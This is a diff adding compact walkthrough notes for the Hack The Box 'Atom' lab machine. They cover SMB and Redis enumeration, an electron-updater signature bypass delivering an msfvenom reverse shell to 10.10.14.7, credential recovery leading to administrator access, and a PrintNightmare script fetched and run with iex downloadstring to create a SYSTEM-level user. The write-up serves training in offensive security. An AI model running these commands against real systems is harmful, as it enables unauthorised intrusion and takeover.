@@ -1,0 +1,81 @@
+HTB - Atom
+
+=== RECON ===
+Nmap
+$ nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.237
+$ nmap -p 80,135,443,445,5985,6379,7680 -sCV -oA scans/nmap-tcpscripts 10.10.10.237
+
+Redis - TCP 6379
+$ nc 10.10.10.237 6379 -> can connect to redis with nc or redis-cli
+$ redis-cli -h 10.10.10.237 -> rejected for lack of auth
+
+SMB - TCP 445
+$ smbmap -H 10.10.10.237 -> auth error
+$ smbmap -H 10.10.10.237 -u oxdf -p oxdf -> guest session
+$ smbclient -N -L //10.10.10.237 -> list shares
+$ crackmapexec smb 10.10.10.237 --shares -u oxdf -p oxdf -> works similarly to smbmap
+- Only non-standard share is Software_Updates
+$ smbclient //10.10.10.237/Software_Updates
+> get UAT_Testing_Procedures.pdf
+    - Internal document describing testing procedures for Heed
+    - Software updates are tested by putting them into a client folder from SMB share
+
+Website - TCP 80/443
+- HTTP and HTTPS seem to return same site
+- Page has links to download heed
+- Ran ferobuster with -x php
+
+Heed RE
+$ unzip -l heed_setup_v1.0.0.zip
+$ file heedv1\ Setup\ 1.0.0.exe -> EXE is a Nullsoft installer self-extracting archive
+- Format of $PLUGINSDIR reveals that it is Electron application
+- Decompress app-64.7z
+- app.asar contains JS and HTML templates
+$ npm -g install asar -> asar l app.asar -> lists files
+$ asar ef app.asar main.js -> extract main.js from app.asar
+- "url: 'http://updates.atom.htb'" found in resources/app-update.yml -> add to /etc/hosts
+- Failed GET request to Atom for latest.yml (running wireshark on windows vm)
+
+=== SHELL AS JASON ===
+Exploit
+- From enumeration google "electron-updater", "latest.yml auto-updater exploit", ...
+- Putting ' in filename breaks signature checks during software update
+    - v'ulnerable-app-setup-1.2.3.exe
+    - v';calc;'ulnerable-app-setup-1.2.3.exe
+
+Shell
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe -o rev.exe
+$ sha512sum rev.exe | cut -d ' ' -f1 | xxd -r -p | base64 -w0 -> latest.yml under sha512
+- Upload latest.yml and binary to a client folder
+> put latest.yml
+> put rev.exe r'ev.exe
+$ rlwrap nc -lnvp 443
+> whoami -> atom/jason
+> type user.txt -> USER FLAG
+
+=== SHELL AS ADMINISTRATOR ===
+Enumeration
+- node_modules and PortableKanban in Downloads directory
+- Google search for portablekanban -> exploitdb
+    - Exploit decodes stored creds from PortableKanban.pk3
+- PortableKanban.cfg has DB info
+> type redis.windows-service.conf | select-string -pattern "^#" -NotMatch | select-string . -> requirepass kidvscat_yes_kidvscat
+$ redis_cli -h 10.10.10.237
+> get pk:urn:user:e8e...0a0
+
+Decrypt Password
+- Exploit script has key and IV for DES decryption -> CyberChef to decrypt password
+- Can also modify python script to decrypt -> pass is kidvscat_admin_@123
+
+WinRM
+$ crackmapexec winrm 10.10.10.237 -u administrator -p 'kidvscat_admin_@123' -> works with administrator username
+$ evil-winrm -i 10.10.10.237 -u administrator -p 'kidvscat_admin_@123'
+> cat root.txt -> ROOT FLAG
+
+=== BEYOND ROOT ===
+> wget 10.10.14.7/CVE-2021-1675.ps1 -outfile ./in.ps1
+> Import-Module .\in.ps1 -> blocked
+> iex(new-object net.webclient).downloadstring('http://10.10.14.7/CVE-2021-1675.ps1')
+> iex(cat in.ps1 -raw)
+> Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
+$ psexec.py 0xdf:0xdf0xdf@10.10.10.237 cmd.exe -> remote execution as SYSTEM
